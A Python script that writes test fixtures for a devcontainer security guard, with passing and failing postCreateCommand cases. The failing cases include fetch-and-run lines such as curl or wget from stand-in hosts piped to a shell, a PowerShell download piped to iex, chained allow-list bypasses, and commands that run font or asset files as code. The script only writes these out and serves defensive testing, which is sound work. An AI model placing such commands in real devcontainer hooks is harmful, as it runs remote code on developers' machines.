#!/usr/bin/env python3
"""Generate devcontainer guard fixtures under tests/guard/fixtures/devcontainer/.

Positive = the guard MUST fail (rc != 0). Negative = the guard MUST pass (rc == 0).
Self-contained; no network, no execution of any inspected command.

Fixtures cover:
  * direct danger patterns (fetch-to-shell, asset path, root + hooks)
  * allow-list bypass via command chaining (&&, ;, newline, backslash, env var)
  * array and object forms of postCreateCommand (valid devcontainer spec)
  * legit bootstrap commands (bun, pip, apt) and clean array/object forms
"""

from __future__ import annotations

import json
import os
import sys
from pathlib import Path

HERE = Path(__file__).resolve().parent
BASE = HERE / "devcontainer"


POSITIVE = {
    # Direct danger patterns (pre-existing)
    "fetch-and-run": {
        "postCreateCommand": "curl -fsSL https://evil.example/install.sh | sh",
    },
    "runs-asset-path": {
        "postCreateCommand": "node ./public/fonts/fa-solid-500.woff2",
    },
    "poststart-network": {
        "postStartCommand": "wget -qO- https://example.invalid/bootstrap.sh | bash",
    },
    "root-with-hooks": {
        "remoteUser": "root",
        "postCreateCommand": "cargo build",
    },
    "initialize-exec": {
        "initializeCommand": "sh -c 'curl -s https://x.example/i | sh'",
    },
    "ps-fetch": {
        "postAttachCommand": "Invoke-WebRequest https://x.example/p.ps1 | iex",
    },
    # Allow-list bypass via command chaining (NEW — regression for FN review)
    "npm-ci-chain-curl": {
        "postCreateCommand": "npm ci && curl -s http://evil.test/x.sh | sh",
    },
    "npm-ci-semicolon-curl": {
        "postCreateCommand": "npm ci; curl evil.test | sh",
    },
    "cargo-chain-font": {
        "postCreateCommand": "cargo build && node ./public/fonts/fa-solid-500.woff2",
    },
    # Array and object forms with danger (NEW — spec forms)
    "array-form-danger": {
        "postCreateCommand": ["npm ci", "curl evil.test | sh"],
    },
    "object-form-danger": {
        "postCreateCommand": {"command": "node ./dist/setup.js"},
    },
    # named-command object under an arbitrary key ("setup") that is NOT
    # "command": the whole object must still be scanned.
    "named-key-setup-danger": {
        "postCreateCommand": {"setup": "curl https://evil.example/install.sh | sh"},
    },
    # "command" key present AND a dangerous sibling key: the sibling must be
    # scanned too (reading only val["command"] skips it).
    "command-key-with-dangerous-sibling": {
        "postCreateCommand": {
            "command": "npm ci",
            "setup": "curl https://example.invalid/setup.sh | sh",
        },
    },
    # array form executing an interpreter directly (argv), no shell involved
    "array-argv-node-woff2": {
        "postCreateCommand": ["node", "./public/fonts/x.woff2"],
    },
    "array-argv-bash-dist-js": {
        "postCreateCommand": ["bash", "./dist/setup.js"],
    },
    "array-argv-sh-c-fetch": {
        "postCreateCommand": ["sh", "-c", "npm ci && curl https://example.invalid/setup.sh | sh"],
    },
    # bare (no "./") asset/seed paths must be flagged as well
    "asset-bare-dist-js": {
        "postCreateCommand": "node dist/setup.js",
    },
    "asset-bare-public-fonts-js": {
        "postCreateCommand": "node public/fonts/x.js",
    },
    "asset-bare-assets-mjs": {
        "postCreateCommand": "node assets/bootstrap.mjs",
    },
    "object-form-empty": {
        "postCreateCommand": {},
    },
    "object-form-bad-type": {
        "postCreateCommand": {"command": 42},
    },
    # array-form hooks must be lists of strings; malformed elements fail closed
    "array-element-number": {
        "postCreateCommand": [42],
    },
    "array-element-null": {
        "postCreateCommand": [None],
    },
    "array-element-object": {
        "postCreateCommand": [{"setup": "curl https://example.invalid/x | sh"}],
    },
    "array-element-mixed-object": {
        "postCreateCommand": ["node", {"path": "dist/setup.js"}],
    },
    "array-element-subarray": {
        "postCreateCommand": [["npm", "ci"]],
    },
}

NEGATIVE = {
    "clean-minimal": {
        "name": "rust",
        "image": "mcr.microsoft.com/devcontainers/rust:1",
        "features": {"ghcr.io/devcontainers/features/rust:1": {}},
    },
    "clean-npm-ci": {
        "postCreateCommand": "npm ci",
    },
    "clean-cargo-build": {
        "postCreateCommand": "cargo build",
    },
    "clean-apt-update": {
        "postCreateCommand": "sudo apt-get update && sudo apt-get install -y jq",
    },
    "root-without-hooks": {
        "remoteUser": "root",
        "build": {"dockerfile": "Dockerfile"},
    },
    "jsonc-comments-trailing-comma": None,  # written specially below
    # Legit bootstrap commands added after FP review (NEW)
    "clean-bun-install": {
        "postCreateCommand": "bun install",
    },
    "clean-pip-install": {
        "postCreateCommand": "pip install -r requirements.txt",
    },
    # Clean array/object forms (NEW — spec forms)
    "array-form-clean": {
        "postCreateCommand": ["npm ci", "cargo build"],
    },
    "object-form-clean": {
        "postCreateCommand": {"command": "npm ci"},
    },
    # named-command object under an arbitrary key ("setup"): legitimate
    # bootstrap must not be flagged just because the key is not "command".
    "named-key-setup-clean": {
        "postCreateCommand": {"setup": "npm ci"},
    },
    # named-command object with both a "command" key and an extra key
    "named-key-multi-clean": {
        "postCreateCommand": {"command": "cargo build", "setup": "npm ci"},
    },
    # a valid array form (exec directly, no shell)
    "array-form-argv-clean": {
        "postCreateCommand": ["npm", "ci"],
    },
}


def write_jsonc_with_comments(path: Path) -> None:
    path.write_text(
        "// dev container for Rust tooling\n"
        "{\n"
        '  "name": "rust",\n'
        '  // build from the local Dockerfile\n'
        '  "build": {"dockerfile": "Dockerfile"},\n'
        '  "postCreateCommand": "cargo build",\n'
        '  "extensions": ["rust-lang.rust-analyzer"],\n'
        "}\n",
        encoding="utf-8",
    )


def main() -> int:
    for case, payload in POSITIVE.items():
        d = BASE / "positive" / case
        d.mkdir(parents=True, exist_ok=True)
        (d / "devcontainer.json").write_text(json.dumps(payload, indent=2) + "\n", encoding="utf-8")
        (d / "notes.txt").write_text(f"positive (must FAIL): {case}\n", encoding="utf-8")
    for case, payload in NEGATIVE.items():
        d = BASE / "negative" / case
        d.mkdir(parents=True, exist_ok=True)
        if case == "jsonc-comments-trailing-comma":
            write_jsonc_with_comments(d / "devcontainer.json")
        else:
            (d / "devcontainer.json").write_text(json.dumps(payload, indent=2) + "\n", encoding="utf-8")
        (d / "notes.txt").write_text(f"negative (must PASS): {case}\n", encoding="utf-8")
    print(f"devcontainer fixtures written to {BASE}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
